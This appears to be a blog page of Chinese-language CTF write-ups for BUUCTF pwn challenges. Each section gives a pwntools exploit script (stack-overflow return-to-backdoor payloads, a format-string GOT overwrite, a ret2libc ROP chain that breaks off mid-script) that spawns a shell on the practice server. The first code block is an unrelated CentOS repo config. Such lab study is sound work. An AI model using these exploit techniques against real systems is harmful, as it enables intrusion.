<h1 id="BUUCTF-pwn"><a href="#BUUCTF-pwn" class="headerlink" title="BUUCTF-pwn"></a>BUUCTF-pwn</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># CentOS-Media.repo</span><br><span class="line">#</span><br><span class="line">#  This repo can be used with mounted DVD media, verify the mount point for</span><br><span class="line">#  CentOS-6.  You can use this repo and yum to install items directly off the</span><br><span class="line">#  DVD ISO that we release.</span><br><span class="line">#</span><br><span class="line"># To use this repo, put in your DVD and use it with the other repos too:</span><br><span class="line">#  yum --enablerepo=c6-media [command]</span><br><span class="line">#  </span><br><span class="line"># or for ONLY the media repo, do this:</span><br><span class="line">#</span><br><span class="line">#  yum --disablerepo=\* --enablerepo=c6-media [command]</span><br><span class="line"> </span><br><span class="line">[c6-media]</span><br><span class="line">name=CentOS-$releasever - Media</span><br><span class="line">baseurl=file:///media/CentOS/</span><br><span class="line">        file:///media/cdrom/</span><br><span class="line">        file:///media/cdrecorder/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># CentOS-Base.repo</span><br><span class="line">#</span><br><span class="line"># The mirror system uses the connecting IP address of the client and the</span><br><span class="line"># update status of each mirror to pick mirrors that are updated to and</span><br><span class="line"># geographically close to the client.  You should use this for CentOS updates</span><br><span class="line"># unless you are manually picking other mirrors.</span><br><span class="line">#</span><br><span class="line"># If the mirrorlist= does not work for you, as a fall back you can try the </span><br><span class="line"># remarked out baseurl= line instead.</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">[base]</span><br><span class="line">name=CentOS-$releasever - Base</span><br><span class="line">baseurl=http://vault.centos.org/6.7/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line"># released updates </span><br><span class="line">[updates]</span><br><span class="line">name=CentOS-$releasever - Updates</span><br><span class="line">baseurl=http://vault.centos.org/6.7/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line"># additional packages that may be useful</span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-$releasever - Extras</span><br><span class="line">baseurl=http://vault.centos.org/6.7/extras/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line"># additional packages that extend functionality of existing packages</span><br><span class="line">[centosplus]</span><br><span class="line">name=CentOS-$releasever - Plus</span><br><span class="line">baseurl=http://vault.centos.org/6.7/centosplus/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br><span class="line"># contrib - packages by Centos Users</span><br><span class="line">[contrib]</span><br><span class="line">name=CentOS-$releasever - Contrib</span><br><span class="line">baseurl=http://vault.centos.org/6.7/contrib/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br></pre></td></tr></table></figure>













<p>比较简单参考别人的wp</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bing_Max/article/details/119947896">BUUCTF PWN—–第1题:test_your_nc_buuctf pwn第一题-CSDN博客</a></p>
<p>一、首先下好附件，用checksec检查一下保护机制。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448542.png" alt="image-20240613185853565"></p>
<p>可以看出是64位程序，并且NX是打开的。（堆栈不可执行）</p>
<p>二、静态分析，ida打开！main函数看看，直接调用了&#x2F;bin&#x2F;sh,所以根据题目提示直接nc就行.</p>
<p>这里了解一下system函数调用（&#x2F;bin&#x2F;sh）</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448409.png" alt="image-20240613190445023"></p>
<p><strong>收获：</strong>简单的了解一下nc，就是一个起到监听作用</p>
<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>2024.6.14</p>
<p>ida打开，64位，elf文件。</p>
<p>看见了gets和puts，猜测应该是一个栈溢出！！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448389.png" alt="image-20240701162548343"></p>
<blockquote>
<p>（看的wp，他说别一味的F5反编译，有时候汇编也可以很容易看的很明白）</p>
</blockquote>
<p>看一眼栈的结构</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448456.png" alt="image-20240701162730003"></p>
<p>所有长度为：（0xf+8）</p>
<p>找一下溢出点，看一下字符串</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448776.png" alt="image-20240701162905900"></p>
<p>发现其实就是假的，捣乱的</p>
<p>最后在fun函数里找到</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448779.png" alt="image-20240701164448472"></p>
<p>其实就是一共后门函数，把它溢出到这就行。</p>
<p>​	<img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448120.png" alt="image-20240701164641451"></p>
<blockquote>
<p>p64(0x40118A)</p>
</blockquote>
<ul>
<li>所以payload&#x3D;’b’*(0xf+8)+p64(0x40118A)</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27032</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">8</span>)+p64(<span class="number">0x40118A</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>就可以打通了！！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448122.png" alt="image-20240701164744068"></p>
<p>得到flag</p>
<p>flag{3db71f1c-61e9-4343-a218-3770e313470f}</p>
<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>2024.6.14</p>
<p>首先checksec查看一下保护机制</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607911.png" alt="image-20240614200748332"></p>
<p>ida64位，打开看看，main函数看一看</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031448517.png" alt="image-20240614201150481"></p>
<p>看见gets，猜测应该就是栈溢出的题。</p>
<p>然后我们ida大概看看能不能找到system（）函数</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607912.png" alt="image-20240614201428144"></p>
<p>很简单就找到了这个函数，	 </p>
<ul>
<li>看一下它的地址，然后找一下这个get函数的溢出条件！</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607913.png" alt="image-20240614201615985"></p>
<p>找到V5的地址。加上它的返回值，就可以了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449042.png" alt="image-20240614203259982"></p>
<p>所以payload&#x3D;’a’*(0x40+8)+p64(0x400611)</p>
<p>所以exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27947</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>还是比较简单的！！</p>
<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>2024.6.16</p>
<p>首先看一下保护机制</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449390.png" alt="image-20240616133958701"></p>
<p>有NX和64位架构，然后拖入ida静态看一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449036.png" alt="image-20240616134227774"></p>
<p>很快就找找到了溢出的地方，简单栈溢出，gets函数，也看见了下面要溢出的system函数，这时候就要看一下他们的地址和gets的栈结构了！！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449663.png" alt="image-20240616134520124"></p>
<p>​	</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607914.png" alt="image-20240616134623702"></p>
<p>这时候就可以知道payload是是多少了。</p>
<blockquote>
<p>payload&#x3D;b’A’*0x38+p64(0x4006BE)</p>
</blockquote>
<p>exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26977</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x4006BE</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>还是一道比较简单的栈溢出。</p>
<p>这里有两种解题答案!</p>
<p>​                                      <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41696518/article/details/125761739">ciscn_2019_n_1 ——两种解法_0x41348000-CSDN博客</a></p>
<p>​               </p>
<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>2024.6.16</p>
<p>查下保护机制</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449587.png" alt="image-20240616140421274"></p>
<p>首先开启了NX（堆栈不可执行）保护，无法往堆栈上写东西。32位</p>
<p>ida静态分析一下！</p>
<p>main函数里看一眼没有，查看一下字符串！</p>
<p>看见了要溢出的地方，再找一下溢出点。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449871.png" alt="image-20240616141050740"></p>
<p>看一下它的地址</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607915.png" alt="image-20240616152604543"></p>
<p>大概就是它了！</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449360.png" alt="image-20240616141714159"></p>
<p>老规矩，找到栈的长度和返回地址的EIP</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449631.png" alt="image-20240616144623380"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031449617.png" alt="image-20240616145455643">	</p>
<p>所以payload如下：</p>
<blockquote>
<p>payload &#x3D; ‘a’*(0x40)+p32(0x8048F0D)</p>
</blockquote>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27300</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>)+p32(<span class="number">0x8048F0D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是看了一下，没有覆盖成功。</p>
<p>SO，上网找一下，于是乎</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031450332.png" alt="image-20240616152938720"></p>
<p>在ida中看</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031450461.png" alt="image-20240616153402144"></p>
<p>所以exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25269</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x24</span>)+p32(<span class="number">0x8048F0D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>2024.6.17</p>
<p>简单检查一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031450741.png" alt="image-20240617124838710"></p>
<p>有NX，并且是64位</p>
<p>ida静态分析一下，查看一下字符串，找到system函数。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031450635.png" alt="image-20240617125140655"></p>
<p>看一下它的地址，0x40059A</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031450667.png" alt="image-20240617125213367"></p>
<p>找到溢出点，read函数</p>
<p>​	<img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031450545.png" alt="image-20240701174151453"><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031450326.png" alt="image-20240617125552752"></p>
<p>老规矩，</p>
<blockquote>
<p>payload&#x3D;‘a’*0x88+ p64(0x40059A)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29633</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+ p64(<span class="number">0x40059A</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607916.png" alt="image-20240617130157097"></p>
<p>​                            flag{df26c70f-d2d6-42cf-b9d8-017f492a0a4a}</p>
<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>2024.6.17</p>
<p>例行检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451959.png" alt="image-20240617160336603"></p>
<p>有NX和Stack两个，有canary应该是无法溢出的，32位</p>
<p>ida静态分析一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451969.png" alt="image-20240617160629073"></p>
<p>找一下漏洞，转了一圈，发现是这个格式化字符串漏洞</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451465.png" alt="image-20240701203946414"></p>
<p>首先找一下偏移量，发现偏移量为10</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451324.png" alt="image-20240701204345851"></p>
<p>所以exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25676</span>)</span><br><span class="line">process</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>2024.6.17</p>
<p>保护机制看一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451489.png" alt="image-20240617192853939"></p>
<p>NX开启，可能为栈溢出</p>
<p>ida静态分析一下</p>
<p>找到system函数，发现有两个</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451090.png" alt="image-20240617193611848"></p>
<p>溢出点还是很好找的</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451219.png" alt="image-20240617193640235"></p>
<p>看一下栈的结构</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451244.png" alt="image-20240617193658682"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031451322.png" alt="image-20240617193712203"></p>
<p>使用</p>
<blockquote>
<p>payload&#x3D;’a’*0x8c+p32(0x804845C)+p32(0x804824B)</p>
</blockquote>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25784</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(<span class="number">0x804845C</span>)+p32(<span class="number">0x804A024</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031452690.png" alt="image-20240617195149595"></p>
<p>flag{771e70b6-2538-4648-a9b1-2b1c70e63f1f}</p>
<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>2024.7.11</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031452698.png" alt="image-20240711184955124"></p>
<p>全开，运行一下，猜测是栈溢出</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607917.png" alt="image-20240711185233884"></p>
<p>扔进ida，打开看一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031452939.png" alt="image-20240711190741866"></p>
<p>满足条件就行。直接输入14个17进去</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27801</span>)</span><br><span class="line">payload= p32(<span class="number">17</span>)*<span class="number">14</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What&#x27;</span>s your name?\n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031452706.png" alt="image-20240711192447447"></p>
<p>flag{7989ff14-33aa-4d91-b06f-95b9f8934d78}</p>
<p>okok，解决</p>
<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p>2024.6.19</p>
<p>日常检查一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031452789.png" alt="image-20240619190909135"></p>
<p>有NX保护，应该是溢出的题。64位</p>
<p>找一下溢出点</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607918.png" alt="image-20240620165142068"></p>
<p>溢出的地址如下：</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031453410.png" alt="image-20240620165907311"></p>
<p>猜一下能发生溢出漏洞的地方应该是read()函数。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031453452.png" alt="image-20240620165614916"></p>
<p>看一下栈的结构</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607919.png" alt="image-20240620170308694"></p>
<p>所以payload如下：</p>
<blockquote>
<p>payload&#x3D;’a’*0x18+p64()</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28368</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x4006E6</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是不行，发现覆盖值没有覆盖到</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031453283.png" alt="image-20240620170750821"></p>
<p>所以是哪里出了问题。上网看看！</p>
<p>发现这里的要给nbytes赋个值</p>
<p>所以exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28368</span>)</span><br><span class="line">Payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>) + p64(<span class="number">0x4006E6</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100&quot;</span>)<span class="comment">#这里的100可以换成别的值，比32的值大就行！</span></span><br><span class="line">p.sendline(Payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>flag{a33e0553-59ec-4201-a029-3218cc9d480a}</p>
<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>2024.6.20</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031453097.png" alt="image-20240620180202153"></p>
<p>64位，NX保护,可能是溢出题</p>
<p>ida64位打开，找了一圈，没有明显的system()函数，所以看看能不能找到溢出点，也是看见gets函数了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031453669.png" alt="image-20240620192941504"></p>
<p>看一下它的汇编代码，找找栈的结构</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031453212.png" alt="image-20240620193334337"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031453132.png" alt="image-20240620193338301"></p>
<p>但是我们现在找不到system的地方，也就是找不到要覆盖的跳转的地址。上网搜一手!!</p>
<p>所以这里只能让程序调用这些命令。</p>
<h4 id="利用puts函数泄露libc版本"><a href="#利用puts函数泄露libc版本" class="headerlink" title="利用puts函数泄露libc版本"></a>利用puts函数泄露libc版本</h4><p><strong>这一类题目的基本做法</strong></p>
<blockquote>
<p>1.利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使<br>用的libc的版本。</p>
<p>2.程序里的函数的地址跟它所使用的libc里的函数地址不一样，<strong>程序里函数地址&#x3D;libc里的函数地址+偏移</strong><br><strong>量</strong>，在1中找到了libc的版本，用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</p>
<p>3.得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后我们就可以构造rop去执行system（’&#x2F;bin&#x2F;sh‘）这样的命令</p>
</blockquote>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29142</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span 